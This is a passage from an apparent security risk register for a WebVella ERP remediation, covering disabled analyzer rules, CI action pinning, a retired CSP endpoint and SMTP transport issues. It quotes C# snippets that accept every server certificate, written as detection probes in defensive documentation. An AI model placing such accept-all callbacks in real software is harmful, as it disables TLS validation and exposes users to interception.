Guest grant on either entity. An installation forced back to version 3 and restarted has the version-4
revocations applied and the `role`-entity read grant correctly left behind. And an installation that
replays the SDK patch loses that read grant through the patch's own restatement. The withdrawn version-5
behaviour was separately confirmed absent: no re-assertion occurs on a second start.

### RISK-051 — The `CA3001`–`CA3012` taint-analysis family does not run

> **Revised twice; this is the canonical entry, and it supersedes `RISK-034` and `RISK-035`.** The build
> timings below stand and are now the *secondary* reason the family is absent. Two earlier framings are
> withdrawn and recorded rather than overwritten. The first described the family as listed in a
> `security-analyzers.ruleset` with `Action="None"`: that file never existed. The second described it as
> armed at warning severity by `AnalysisLevelSecurity=latest-all` and tuned to intraprocedural tracking by
> a repository-root `.globalconfig`: that was accurate while those two settings shipped, and they no longer
> do.

**Status: Accepted — the family is outside the gate entirely, on frozen-scope grounds first and cost grounds second, and compensated by four independent controls rather than merely tolerated.**

The dataflow, or taint-analysis, family `CA3001` through `CA3012` traces an untrusted value from an entry
point to a dangerous sink. **It does not execute.** Two independent reasons put it outside the gate, and
they are worth separating because they would have to be lifted in a specific order:

1. **Frozen scope, which is the binding reason.** AAP 0.6.1 Class 2 fixes the analyzer gate at
   `EnableNETAnalyzers` plus `AnalysisLevel=latest-recommended`. That level does not include this family —
   confirmed by probe, alongside the finding that exactly four Security-category rules do execute under it:
   `CA5350`, `CA5351`, `CA5359` and `CA5364`. Reaching the family needs an `AnalysisLevelSecurity` upgrade
   the plan does not authorise.
2. **Cost, which would bind even if the first reason were lifted.** The measurements below were taken while
   the family *was* armed, and they are why it cannot simply be switched back on. They also explain why the
   withdrawal had to take the `.globalconfig` and the level together: the per-rule
   `dotnet_code_quality.*` options that made the family affordable have **no MSBuild equivalent**, so
   deleting the file while keeping the level took a single-project build from 109 s to a timeout at 600 s.

A probe confirmed the rules *work* — a deliberate single-method flow from `HttpContext.Request.Query` into
`DbCommand.CommandText` was reported as `warning CA3001`. Their present silence is therefore the silence of
a disabled rule and carries **no** signal about the code.

**Why the cost reason would bind even without the frozen-scope reason.** Measured, not assumed — and
measured against configurations that no longer ship, which is why the figures are historical evidence for
a hypothetical rather than a description of today's build. A ruleset carrying the 100 non-dataflow security
rules builds the whole solution in **161 seconds**. Adding the twelve dataflow rules and nothing else, the same build **did not
finish inside 3,600 seconds** and was killed at that bound (`exit 124`). At the point it was killed only
**5 of the 19 project builds** had emitted any output, and the single compiler process still running —
`WebVella.Erp.Web`, the largest project in the tree — had accumulated roughly 4,700 seconds of CPU and
1.3 GB of resident memory on its own without completing. That is a floor of **at least 36x** on gate
duration with *no upper bound established and no evidence the build terminates at all* on this hardware
(4 cores). A gate that cannot be shown to finish is not a gate; it is an outage in the pipeline.

**What the partial measurement does and does not show.** It is worth stating precisely, because the
temptation is to over-read it. The five projects that did complete emitted **zero** `CA3001`-`CA3012`
diagnostics, and one of those five is `WebVella.Erp` — the project that owns every SQL composition site
in the platform. That is genuine positive evidence for that project. The other fourteen projects
produced no verdict at all, and **no claim is made about them here.**

**Why the residual is bounded anyway.** Four controls close the specific exposures this family would
detect, and each was implemented and verified independently of any analyzer:

* Value-level SQL injection is closed by parameterisation throughout the data layer; identifier-level
  injection is closed by the single audited `DbIdentifier` validate-and-quote helper applied at every
  concatenation site. `CA2100`, which flags query construction from a non-constant string, does **not**
  execute under the frozen gate; its eight previously-reviewed files are carried by hand under `RISK-052`.
* Unsafe deserialisation is closed by `ErpSerializationBinder`'s exact-type allow-list. `CA2326`,
  `CA2327` and `CA2328` do **not** execute either, so the earlier reading of `CA2327`'s zero count as
  positive evidence that the binder holds is withdrawn — a zero from a rule that never ran is not
  evidence. What does stand is the binder's own verification: the allow-list was exercised directly
  against a rejected type, and the ten previously-reviewed `CA2326`/`CA2328` files are carried by hand
  under `RISK-052`.
* Stored and reflected cross-site scripting is closed at the markup builders with framework HTML
  encoding, proven at runtime against live stored payloads.
* Command and path sinks were enumerated by hand during the audit; the file pipeline is database-backed,
  route segments cannot contain a separator, and the upload and download paths are constrained by
  allow-list, size cap, content-type check and forced attachment disposition.

**What would change this.** More build capacity, or the rules becoming materially cheaper. The correct
way to adopt them is out-of-band — a scheduled job on a larger runner with a multi-hour budget, whose
result is advisory to the merge gate rather than blocking it — not by moving them to `Warning` inside
the per-push gate, which would impose the same cost while removing the enforcement.

### RISK-052 — One security rule is held at Warning; four others no longer run at all

**Status: Accepted — and split in two, because what was one residual is now two of different kinds.**

**The claim this entry used to make, withdrawn.** A previous revision opened "Ninety-five security rules
are promoted to `Error`, which is sound precisely because each was measured at zero diagnostics across all
19 projects before promotion." **Nothing is promoted to `Error`.** AAP 0.6.1 Class 2 freezes the analyzer
gate at `EnableNETAnalyzers` plus `AnalysisLevel=latest-recommended`, and the `AnalysisLevelSecurity`
upgrade and repository-root `.globalconfig` that armed and promoted those ninety-five rules have both been
withdrawn. Under the frozen gate exactly **four** Security-category rules execute — `CA5350`, `CA5351`,
`CA5359`, `CA5364` — all at **warning**, with measured counts of 0, 5, 0 and 0.

**Half A — the one rule that still fires, and is still only a warning.**

| Rule | Sites | Files | Why it is not an error |
|------|-------|-------|------------------------|
| `CA5351` | 5 | `WebVella.Erp/Utilities/CryptoUtility.cs` (4), `WebVella.Erp/Utilities/PasswordUtil.cs` (1) | A broken cryptographic algorithm. These are the **accepted residual** legacy-verification paths that exist so pre-existing credentials and payloads still verify and can be upgraded in place. Removing them would lock existing users out, which the preservation requirement forbids. Promoting the rule would fail the build on unchanged code. |

The five sites are `CryptoUtility.cs` at 186,33 / 198,21 / 208,23 / 225,32 and `PasswordUtil.cs` at
804,27. They are the two entries that remain in the workflow's Gate 1 allow-list, and Gate 1 asserts the
count is exactly 5 — so a sixth site fails CI even though the rule itself is a warning.

**Half B — four rules that have left the gate, and the nineteen reviewed files that consequently have no
automated coverage.** `CA2100`, `CA2326`, `CA2328` and `CA5362` do **not** execute under the frozen gate.
Nineteen `(rule, file)` entries were therefore **pruned** from the Gate 1 allow-list, because an allow-list
entry for a rule that never fires is worse than useless: it would pre-accept diagnostics nobody had
reviewed if the rule were ever re-enabled, and it makes the list read as though coverage exists where it
does not. Their engineering justifications are preserved here, which is the only place they now live:

| Rule | Reviewed files (allow-list entries pruned) | Why it was accepted, and what now covers it |
|------|--------------------------------------------|---------------------------------------------|
| `CA2100` | 8 — `WebVella.Erp/Database/DbRepository.cs`, `DbConnection.cs`, `DbFileRepository.cs`, `WebVella.Erp/Eql/EqlCommand.cs`, `WebVella.Erp/Jobs/JobDataService.cs`, `WebVella.Erp/Notifications/NotificationContext.cs`, `WebVella.Erp.Plugins.SDK/Services/CodeGenService.cs`, `WebVella.Erp.Plugins.SDK/Services/LogService.cs` | Flags a query built from a non-constant string. Values are parameterised throughout and identifiers are validated and quoted through `DbIdentifier`, but the platform compiles its own query language to SQL, so the *shape* the rule looks for is intrinsic to the design and cannot be removed without replacing the query compiler. **Now covered only by** the parameterisation and `DbIdentifier` invariants, and by manual review of any new concatenation site. |
| `CA2326` | 6 — `WebVella.Erp/Database/DbEntityRepository.cs`, `DbRelationRepository.cs`, `WebVella.Erp/Api/Models/AutoMapper/Profiles/JobProfile.cs`, `WebVella.Erp/Jobs/JobDataService.cs`, `WebVella.Erp/Notifications/NotificationContext.cs`, `WebVella.Erp.Plugins.SDK/Services/CodeGenService.cs` | `TypeNameHandling` other than `None`. Deliberate and load-bearing: already-persisted payloads carry type discriminators and would fail to deserialise without it. The exposure is closed by the binder, not by removing the setting. **Now covered only by** `ErpSerializationBinder`'s exact-type allow-list and manual review. |
| `CA2328` | 4 — `WebVella.Erp/Database/DbEntityRepository.cs`, `DbRelationRepository.cs`, `WebVella.Erp/Api/Models/AutoMapper/Profiles/JobProfile.cs`, `WebVella.Erp.Plugins.SDK/Services/CodeGenService.cs` | The same setting where the analyzer could not prove the binder was attached. It is attached at all 14 sites; the rule simply could not see it. **Now covered only by** the binder and manual review. |
| `CA5362` | 1 — `WebVella.Erp/Api/Models/QueryObject.cs` | A potential reference cycle during deserialisation, at `QueryObject.SubQueries`. Self-referential by design — a query object contains sub-queries. **Now covered only by** that design being intentional and documented. |

**The honest cost, restated and larger than before.** For `CA5351`, a new violation will not fail the
build; it will appear as a warning among the 3,044 the solution emits, and the mitigation is the count —
Gate 1 prints it and fails if it moves off 5. For the other four rules the cost is different in kind: a new
violation produces **no diagnostic at all**, in CI or locally, so there is no count to watch and no
artifact to inspect. Those four sink classes rest entirely on the code invariants named above and on human
review. That is stated plainly because a green Gate 1 must not be read as covering them.

**Why the four are not simply re-enabled.** Doing so requires `AnalysisLevelSecurity`, which AAP 0.6.1
Class 2 does not authorise, and which cannot be adopted without a repository-root `.globalconfig` to bound
the taint family's cost — measured at a 600 s timeout on a single project when the level was present
without the file. Re-enabling them is therefore a plan change, not a configuration tweak, and it must move
`Directory.Build.props`, the Gate 1 baselines, this allow-list, the positive control and this entry in the
same commit. The workflow enforces exactly that coupling: it fails if a global analyzer config appears, if
`AnalysisLevel` drifts, or if any of these rules fires unexpectedly.

### RISK-053 — SHA-pinned actions stop receiving upstream security fixes

**Status: Accepted — a deliberate trade that creates a standing maintenance obligation.**

`actions/checkout`, `actions/setup-dotnet` and `actions/upload-artifact` are pinned to 40-character
commit SHAs rather than to `@v4`. That is what closes the exposure review finding `F29` identified: a
mutable tag can be repointed by anyone who can push to the action's repository, and a workflow that
resolves `@v4` at run time executes whatever that tag points at *then*, with access to the checkout
token unless it is explicitly withheld.

**The residual is the mirror image of the fix.** A pinned SHA is frozen. If a vulnerability is found in
one of these actions, this workflow keeps running the vulnerable commit until a human updates the pin.
There is no automatic update path, and no notification: nothing in this repository watches for new
action releases.

**Why the trade is still correct here.** The workflow runs on a security-relevant path and has repository
read access with a full history checkout. An unreviewed action change in that position is a
supply-chain compromise; a *stale* action is a bounded and knowable one. Each pin was additionally
verified twice before being written — once that the SHA is the current tip of the `v4` tag, so pinning
introduces no behaviour change, and once that it is the commit of a **named release**, so the pin is
auditable to a human-readable version. Each pin carries that version as a trailing comment
(`# v4.4.0`, `# v4.3.1`, `# v4.6.2`) so the next reviewer can see at a glance what is pinned without
resolving the SHA.

**Two things reduce the residual without removing it.** `persist-credentials: false` on the checkout
step means even a compromised action in this job does not inherit a usable credential. And the job's
`permissions:` block is `contents: read`, so the token it does hold cannot write.

**What closes it.** A recurring review task — quarterly is the usual cadence — that re-resolves each
`@v4` tag, compares it to the pinned SHA, reviews the intervening diff and moves the pin. Automating it
with a dependency-update bot is the conventional answer and is recorded as an ongoing recommendation
rather than done here, because adding and configuring such a bot is new tooling rather than remediation
of a confirmed finding.

### RISK-054 — `CA5359` does not see one of the three accept-all certificate shapes

**Status: Accepted — a narrow, measured detector gap, named so it is not mistaken for coverage.**

Review finding `F2` named one scenario specifically: *reintroducing accept-all certificate code can
leave the build green*. It now cannot, and that was proven rather than argued. A throwaway project
containing the **exact** shape finding `H-11` removed from
`WebVella.Erp.Plugins.Mail/Api/SmtpService.cs` —

```csharp
client.ServerCertificateValidationCallback = (s, c, h, e) => true;
```

— is reported as `warning CA5359: The ServerCertificateValidationCallback is set to a function that
accepts any server certificate`. So is the same defect written against
`ServicePointManager.ServerCertificateValidationCallback`, both as a lambda and as a named method group
that always returns `true`.

**A correction on severity.** An earlier revision of this entry said the probe *failed the build* with
`error CA5359`, which was true while a repository-root `.globalconfig` promoted the rule. That file has
been withdrawn under AAP 0.6.1 Class 2 and **nothing is promoted to `Error`**, so the diagnostic is a
warning. The detection is unchanged — the rule still fires on exactly these shapes — but a reintroduction
would no longer stop the build on its own. What stops it is Gate 1: the rule's baseline is **zero**, and
Gate 1 fails when a Security-category diagnostic appears that is not in its two-entry allow-list. The
enforcement therefore moved from the compiler to the gate, and the workflow's positive control asserts on
every run that `CA5359` still fires against a deliberate defect, so a silent loss of the rule fails CI.

**The gap.** A fourth shape was tested in the same probe and produced **no diagnostic at all**:

```csharp
handler.ServerCertificateCustomValidationCallback = (m, c, ch, e) => true;   // NOT detected
```

That is `HttpClientHandler`'s own property, and neither the object-initializer form nor the plain
assignment form raises `CA5359`. This was found because the first probe written for this proof used
*only* that shape and built green — a green result that would have been read as a gate failure if the
probe had not then been varied. It is recorded here rather than quietly dropped.

**Why the residual is small in this repository, and where it is not.** Every server-side outbound HTTP
client was enumerated during the audit: the only `HttpClient` instances in the tree are in the Blazor
WebAssembly client, which runs in the browser, where certificate validation is the browser's and this
property has no effect. The shapes that *are* detected are exactly the shapes the server-side code has
historically used — the mail transport. So the gap is real but currently unreachable by the code that
exists.

**What closes it.** Two options, neither taken here because both exceed remediation of a confirmed
finding. A custom analyzer or a `BannedApiAnalyzers` entry naming the property would fail the build on
any use of it. Failing that, a grep-shaped assertion in the workflow — the same technique Gate 3 uses
for credential literals — would catch the textual pattern without needing dataflow. Recorded as an
ongoing recommendation.

**Do not read this entry as a reason to distrust `CA5359`.** It fires, Gate 1 enforces its zero baseline,
and it covers the shapes that mattered. The entry exists so that a future reader does not infer from a clean build
that *every* way of disabling certificate validation is gated.

### RISK-055 — RETIRED: the CSP collector whose content-type bound was declined no longer exists

> **Retired, and the reasoning retained deliberately.** The `/csp-violation-report` endpoint was removed in full, together with the `report-uri` directive that required it, so nothing described below is present in the shipped tree — `git grep` finds `csp-violation-report` in no source file except one comment recording the removal. Every bound and mechanism named in this entry is absent: `MaxViolationReportBytes`, `ShouldAcceptReportFromSource`, `ShouldLogReport` and `IsRequestEffectivelyHttps`. The entry is kept because the *decision* it records — that an unrequested content-type allow-list would have breached the minimal-change constraint and refused legitimate reports — is the kind of reasoning a future reader needs if the collector is ever reconsidered. Read every present-tense sentence below as describing the component as it then stood.

**What this risk used to be.** `SecurityHeadersMiddleware` answered `/csp-violation-report` ahead of
routing, and every bound below was enforced inside that branch:
routing, and every bound below is enforced inside that branch:

| Bound | Mechanism | Response |
|-------|-----------|----------|
| Method | `HttpMethods.IsPost` | `405 Method Not Allowed` |
| Transport | `IsRequestEffectivelyHttps`, active outside Development | `403 Forbidden` |
| Per-source volume | `ShouldAcceptReportFromSource`, evaluated **before** the body is read | `429 Too Many Requests` |
| Body size | `MaxViolationReportBytes = 8 * 1024`, a bounded read into a fixed buffer | body truncated at 8 KB |
| Log volume | `ShouldLogReport`, a ceiling separate from the acceptance ceiling | `204 No Content` |

**What is not bounded, and why that is the right answer.** There is no allow-list on the request
`Content-Type`. Phase 8's own task list claimed one had been added; it had not, and the Phase-14
Finding Resolution Verification is what surfaced the discrepancy. The claim is withdrawn here
rather than quietly satisfied by adding the control, for three reasons:

1. **F13 does not require it.** The finding's Required Resolution column reads, in full: "Add
   headers before the branch, enforce HTTPS in Production, and apply an endpoint/source limiter."
   All three are implemented, and the method and size bounds above go beyond what was asked.
   Adding an unrequested control would breach AAP §0.1.3 guideline 4 ("do not enhance or optimize
   beyond remediation") and guideline 7 ("choose the solution requiring the least modification").

2. **It would refuse legitimate reports.** CSP violation reports do not arrive with one stable
   media type. A `report-uri` directive causes browsers to POST `application/csp-report`; the
   Reporting API (`report-to` / `Reporting-Endpoints`) posts `application/reports+json`; and
   intermediaries have been observed normalising both to `application/json`. An allow-list built
   from any one of those refuses the others. The collector exists specifically to gather evidence
   during the report-only phase of the AAP's staged Content-Security-Policy rollout, so silently
   discarding a subset of reports would corrupt the evidence the enforcement decision rests on —
   a functionality regression against the requirement that user-facing behaviour be preserved.

3. **It closes no threat that is not already closed.** The threats F13 names are amplification and
   log-volume denial of service. Amplification is bounded by the per-source ceiling, which is
   evaluated before the body is touched, and by the fixed `204 No Content` reply. Log volume is
   bounded separately. Body size is capped at 8 KB regardless of declared type. A content-type
   test would reject some requests marginally earlier in the same already-bounded path; it would
   not lower any ceiling.

**Residual exposure.** An unauthenticated caller may POST up to 8 KB of arbitrary content with any
declared media type, at a rate below the per-source ceiling, and have a sanitised excerpt written
to the bounded audit sink. The stored text is neutralised for control characters before it is
written, so it cannot forge log structure.

**How to close it if a future reviewer disagrees.** Add a media-type test to the collector branch
that admits `application/csp-report`, `application/reports+json` and `application/json`, and
verify against real browser traffic in report-only mode that no report class is refused before
promoting the check to a refusal. Do not add it as a single-value allow-list.

---

### RISK-056 — RETIRED: the CSP per-source report budget was removed with the collector

> **Retired, and the measurements retained deliberately.** The per-source acceptance ceiling and the endpoint it protected were both removed; `MaxAcceptedReportsPerSourcePerMinute` is absent from the tree. The browser instrumentation below is kept because it is the only measurement of how much inline style and script the report-only policy actually reports, and that figure still governs the report-then-enforce rollout. Read the ceiling and its consequence as history.

**Classification.** Retired. The bound was deliberately kept while the collector existed; what is
recorded here is its measured operational consequence, which replaced an earlier estimate that
measurement disproved.

**What was measured.** Browser instrumentation of a running host counted report beacons per page
load rather than estimating them. A single page load emitted between **13 and 146** beacons, the
upper figure on a list page dense with inline `style` attributes. The per-source ceiling is 60
accepted reports per source per minute, so one source address is admitted roughly one
violation-heavy page load per minute. An earlier revision of the comment on
`MaxAcceptedReportsPerSourcePerMinute` claimed the ceiling "accommodates ordinary navigation"; that
claim was optimistic and has been corrected in the source rather than left standing.

**Why the ceiling is nevertheless kept at 60.** Raising it would weaken a control that review
finding F13 requires, in exchange for reports that carry no new information. The same
instrumentation showed the stream is overwhelmingly repetitive: **1,363 reports resolved to exactly
two distinct blocked-URI classes — 1,347 `inline` and 16 `eval`.** The report-then-enforce rollout
needs the set of DISTINCT violations, and that set was complete far inside the budget. What a
refusal discards is duplicates.

**Residual exposure, stated plainly.** Where many users share one source address — behind a
corporate NAT, or a reverse proxy that does not forward the client address — they share one budget,
so most of their reports are refused. The endpoint stays correctly bounded, but aggregate telemetry
from such a deployment understates violation volume.

**Operator guidance.** Take the enforcement decision from reports gathered on a *representative
client*, not from aggregate volume, and confirm the distinct-violation inventory has stopped growing
before promoting the policy from report-only to enforcing. A refused report costs the caller nothing
and is answered before the body is read, so refusal does not degrade availability.

**Verified.** Application availability was confirmed unaffected while the budget was saturated:
authenticated navigation returned 200 throughout, and the only console error was the browser
reporting its own refused beacons.

---

### RISK-057 — a background diagnostic write can terminate the web host

**Classification.** Documented, not fixed. Out of scope under AAP 0.3.2, which forbids refactoring
beyond security requirements and which already excludes the comparable empty-handler concern in
`ErpErrorHandlingMiddleware` as "a reliability concern, not a security one".

**What happened.** During runtime validation the host process exited. The cause is recorded in the
host log: `ScheduleManager.ProcessSchedulesAsync` caught a schedule failure and attempted to persist
it through `Log.Create`; the PostgreSQL read timed out; the resulting `NpgsqlException` escaped on a
thread-pool thread, which terminates a .NET process.

**Why it is not a regression.** Both files in the fault path — `WebVella.Erp/Jobs/SheduleManager.cs`
and `WebVella.Erp/Diagnostics/Log.cs` — are **byte-identical to `HEAD`**, verified with
`git diff HEAD`. Neither was touched by this remediation. The trigger was machine-level starvation
(load average above 9,000 on four cores, with an unrelated runaway compiler process consuming a
core), not application load.

**Why it is a reliability rather than a security defect.** The write that fails is a diagnostic one,
the timeout is not attacker-controllable through any application surface, and no request path
depends on it. It is recorded because a self-inflicted process exit is worth an owner's attention,
not because it closes an attack.

**Recommended fix, for a future sprint.** Wrap the diagnostic write in its own guard so that a
failure to record an error can never be more severe than the error it was recording, and let the
scheduler continue. This is a small change, but it is a correctness change to background-job code
with no finding behind it, so it is deliberately not made here.

---

### RISK-058 — absent third-party source maps surface as the catch-all 405

**Classification.** Documented, not fixed. Third-party content, which AAP 0.3.2 restricts to version
updates only.

**What was observed.** A browser with DevTools attached requested `bootstrap.css.map` and
`decimal.min.js.map`, because the shipped assets reference them through `sourceMappingURL`. Neither
map is present, and the application answers any unmatched path with a uniform **405**, so the probes
appear in the server log as 405s.

**Provenance.** Neither file is tracked in this repository (`git ls-files` returns no match), and the
referencing assets are served from `_content/WebVella.TagHelpers/`, so both the reference and the
omission belong to the `WebVella.TagHelpers` package.

**Impact.** None. The requests are issued only while a debugger is attached, never appear in a page's
own network log or Resource Timing, produce no console error, and no functionality depends on source
maps. Recorded so that a reader of the access log is not misled into treating them as a broken
application endpoint.

**Note on the 405 itself.** That the application answers unmatched paths with 405 rather than 404 was
confirmed directly (`GET /this/path/does/not/exist.xyz` returns 405). This is pre-existing routing
behaviour, it discloses nothing, and it is not changed here.

### RISK-059 — CLOSED: the SDK pin is exact, and the residual is now an outage rather than a drift

| Field | Value |
| --- | --- |
| **Status** | **Closed** by review finding `CR2-F-13` — the drift this entry accepted has been eliminated, not merely bounded. |
| **Related finding** | `L-07` (no lock file, unpinned toolchain), `M-6` (toolchain pin not strict), `CR2-F-13` (patch roll-forward permits an unreviewed scanner SDK), and the reproducibility premise of Gate 1 and Gate 2. |
| **Owner** | Platform team |

**Closure.** `global.json` now reads
`{ "sdk": { "version": "10.0.302", "rollForward": "disable" } }`. The toolchain is exact, so the
analyzer and advisory figures recorded in these documents are reproducible by construction and this
entry's residual no longer exists. The remainder of the entry is retained as the reasoning record,
because the argument it lost is instructive: it shows how a plausible-sounding bound can leave the thing
it was bounding free to move.

**What the entry accepted, and why that was wrong.** It read
`{ "sdk": { "version": "10.0.302", "rollForward": "latestPatch" } }`. The feature band was therefore
still pinned — a 10.0.4xx or 11.x SDK refused — but any later **patch** on 10.0.3xx was accepted. The
band argument protected the *shape* of the gate, since the audit-mode default and the analyzer rule set
are band-selected, while leaving its *content* free to move: rule content and default severities can
change within a band, and the analyzer gate names individual rule identifiers in the allow-list Gate 1 enforces while
`Directory.Build.props` promotes six NuGet audit diagnostics to build errors, so a patch could change what
those names mean with no repository edit at all. This was
additionally a **regression** rather than a fresh gap — `disable` had been the original remediation of
`M-6`, and reverting it re-opened a closed finding, which is why the reversal is now recorded in three
places rather than one.

**Why the residual this entry described was real.** Both automated gates are properties of the toolchain,
not only of the source. `AnalysisLevel=latest-recommended` resolves its rule set from the SDK, and
`NuGetAuditMode`/`NuGetAuditLevel` defaults are SDK-versioned. A patch that adds a rule, changes a default
severity, or alters an audit default can therefore change a gate verdict with no repository change at
all — which is precisely the property a pinned toolchain exists to prevent.

**Why the earlier rejection of `rollForward: disable` is withdrawn.** A previous revision of this entry
rejected `disable` on the grounds that it demands the exact patch, fails outright when it is absent, and so
converts an ordinary CI image refresh into a hard build outage for every contributor at once. That
description of the consequence is accurate and is retained below. What does not survive is the *weighing*.
AAP 0.6.1 Class 2 requires the toolchain pinned precisely **because** the audit-mode default and the
analyzer rule set both move with the SDK; a gate whose verdict can change with no repository change is not
a gate, and an unreproducible gate is the larger of the two harms. The earlier entry also weighed the
outage as "the failure that gets a gate disabled rather than investigated" — but a *silent* verdict change
is worse than a loud failure, because nobody investigates what they cannot see.

**The residual, inverted.** What remains is exactly the consequence the earlier entry named: the repository
becomes unbuildable the moment SDK 10.0.302 is unavailable. That is a deliberate **fail-closed**, and it is
bounded by making the required version impossible to miss — it is named in the workflow's SDK setup step, in
`SECURITY.md`, and in the [secure configuration guide](secure-configuration.md). The remedy for a
contributor who hits it is to install 10.0.302, not to loosen the pin; loosening it silently invalidates
every baseline in Gate 1, which is why the workflow additionally asserts `AnalysisLevel` and the absence of
a global analyzer config on every run.

**How the remaining reproducibility gap is bounded.** Gate 1 publishes its measured baselines — the four
Security-category rules that execute under the frozen gate, at counts 0 / 5 / 0 / 0 — so a rule-set shift
shows up as a baseline change rather than as a silent pass. The gate also carries a positive control that
builds deliberate defects on every run and asserts **both** directions: that `CA5350`, `CA5359` and
`CA5364` are reported, and that `CA5390` and `CA2100` are not. An SDK that stopped emitting the security
rules, or started emitting rules the baselines were not measured against, fails the run instead of turning
it green.

**Recommended fix, for a change permitted to add build infrastructure:** record the resolved SDK version in
the gate's own evidence on every run and assert it against the pin, so the pin is proven rather than
assumed; and add a lock file (`packages.lock.json`) so the dependency graph is reproducible independently of
the SDK that restores it.

## Detailed entries — pre-existing mail-transport observations recorded during the H-11 follow-up

The eight entries below were surfaced by the runtime QA pass over the SMTP transport-security change
(`H-11`) and its dependency companion (`H-20`). None of them was introduced by that change: each was
reproduced against code that is byte-identical to `HEAD` for the lines concerned, and the checkpoint diff
for `SmtpInternalService.cs` is exactly the certificate hunks. None is Critical. Under the Minimal Change
Clause — guideline 8, *document out-of-scope concerns but do not fix unless Critical*, reinforced by
AAP 0.3.2 which forbids refactoring beyond security and forbids feature additions — the correct
disposition for all eight is to record them here with a concrete recommended fix, not to change code.

Each entry states what was **observed**, not what was assumed, because six of the eight were reproduced at
runtime against a real PostgreSQL-backed installation and real SMTP endpoints rather than read off the
source alone.

### RISK-061 — the SMTP queue's concurrency guard is per-process, so two hosts deliver every message twice

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | Pre-existing; surfaced by the `H-11` runtime pass. Adjacent to `H-11` only in that both live in `SmtpInternalService.cs`. |
| **Owner** | Platform team |

`SmtpInternalService` declares `private static object lockObject` and
`private static bool queueProcessingInProgress`, and `ProcessSmtpQueue` takes that lock on entry and
again on exit. Both are **process** state. Nothing in the database marks a row as claimed: the pass
selects `Pending` rows whose `scheduled_on` has elapsed, sends each, then writes the outcome.

**What was observed.** Three messages were queued against a relay that accepts, `scheduled_on` was
backdated, and two `ProcessSmtpQueue` passes were started concurrently in separate processes. The relay
recorded **six** deliveries. The database held **three** rows, all at `Sent`. Every recipient therefore
received the message twice while the audit trail showed a single clean delivery each.

**Why this is structural rather than a race window.** The duplication does not depend on interleaving at a
particular instant. Each process independently observes the same eligible set, and neither has any means of
telling the other that a row is in flight. Narrowing the timing would not reduce the duplication; only a
claim that both processes can see would.

**Why it is nevertheless out of scope here.** It is a delivery-semantics defect, not a security weakness:
no confidentiality, integrity or authorisation boundary is crossed, and the duplicate is the same message to
the same recipient. Fixing it means introducing a distributed claim — a schema change, or a lease column, or
an advisory lock — which AAP 0.9.2 forbids outright (*no schema change*) and AAP 0.3.2 classes as an
architectural change.

**How the residual is bounded today.** A single-host deployment running a single background-job scheduler is
unaffected, which is the shape the platform's own job infrastructure assumes. The exposure appears only when
the console application is run against a live database alongside a web host, or when a host is scaled out.

**Recommended fix, for a change permitted to touch the schema:** claim each row before sending, using
`SELECT … FOR UPDATE SKIP LOCKED` inside the transaction that flips the row out of `Pending`, so a second
process sees an empty eligible set rather than the same one. If a schema change is unacceptable, take a
PostgreSQL advisory lock keyed on the queue (`pg_try_advisory_lock`) around the whole pass, which converts
the per-process flag into a per-database one with no DDL. Either way, keep the existing in-process flag: it
still prevents a second pass inside one host.

### RISK-062 — no send timeout is configured, so a transport misconfiguration blocks for two minutes

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8; the operator-visible symptom is recorded in `secure-configuration.md`. |
| **Related finding** | Pre-existing; identical before and after `H-11`. |
| **Owner** | Platform team |

A repository-wide search for `.Timeout` across the mail plugin returns **no hits**, so MailKit's constructor
default governs every one of the five connect sites. Probing the library directly reports
`SmtpClient.Timeout = 120000` — two minutes.

**What was observed.** The same probe also reports `CheckCertificateRevocation = True`, which is the
independent confirmation of the root cause behind `H-11`'s follow-up: the plugin inherits whatever MailKit
defaults to, for both properties, because it assigns neither.

**Why it matters operationally.** A `connection_security` value that disagrees with the port is the common
misconfiguration — implicit TLS against a STARTTLS port, or STARTTLS against a port that answers with a TLS
ClientHello. Neither fails fast. The request thread, or the queue pass, blocks for the full two minutes and
only then surfaces an error, which reads as a hang rather than as a configuration mistake.

**Why it is out of scope here.** The value is identical before and after the certificate work; nothing in
`H-11` introduced or widened it, and choosing a timeout is a behavioural change to every send path, which is
precisely what the preservation requirement protects.

**Recommended fix:** set `client.Timeout` from the SMTP service row — a new optional column, defaulting to
the current 120,000 ms so no existing installation changes behaviour — or, without a schema change, from a
`Settings:EmailSMTPTimeoutMilliseconds` key with the same default. Apply it at all five connect sites, next
to the two policy assignments already there, so the transport knobs stay in one place.

### RISK-063 — a service row may be configured for cleartext, and then the relay credential travels in the clear

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8 and AAP 0.3.2; a deployment-configuration responsibility. |
| **Related finding** | Adjacent to `H-11` but distinct from it. CWE-319, cleartext transmission. |
| **Owner** | Deployment owner |

`SmtpService.ConnectionSecurity` is mapped straight from the `connection_security` column and handed to
`client.Connect` unaltered. The platform applies no floor: `0` means `SecureSocketOptions.None`, and
`StartTlsWhenAvailable` silently degrades to cleartext against a relay that does not advertise `STARTTLS`.

**What was observed on the wire.** A service row with `connection_security = 0` and a username configured
was driven against an endpoint that advertises `AUTH` on the cleartext channel. The transcript shows the
connection established with `tls=False`, `STARTTLS` advertised by the server and never issued by the client,
the `AUTH` command sent on the unencrypted socket, and the message accepted. The send returned success while
certificate revocation checking was at its **secure default** — because on this path no certificate is
presented, requested or examined at all.

**Why this is not an `H-11` bypass, and why saying so precisely matters.** It is tempting to read
"delivered without any certificate validation" as a hole in the certificate work. It is not. The certificate
controls govern what happens when TLS is negotiated; this row never negotiates TLS. Conflating the two would
misdirect the fix toward the certificate policy, which cannot help, and away from the transport
configuration, which is the only thing that can.

**What is actually given up.** Message contents and, when a username is present, the relay credential are
readable by anything on the path. The credential is the more serious half, because it is long-lived and
reusable.

**Recommended fix:** reject the insecure combination at the point where it is authored rather than at send
time — extend the `smtp_service` create and update validation hooks to refuse `connection_security = None`
whenever a username is present, and to warn when it is set at all. That is a validation-hook change with no
schema impact. Operators who genuinely relay to a trusted host over a loopback or private segment can be
given an explicit opt-out key, kept symmetrical with the two certificate keys already documented.

### RISK-064 — a failed direct send leaves no audit row, while a failed queued send does

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | Pre-existing; surfaced by the `H-11` runtime pass because the change makes certificate refusals a routine failure mode. |
| **Owner** | Platform team |

All four direct `SendEmail` overloads follow the same shape: connect, authenticate if a username is present,
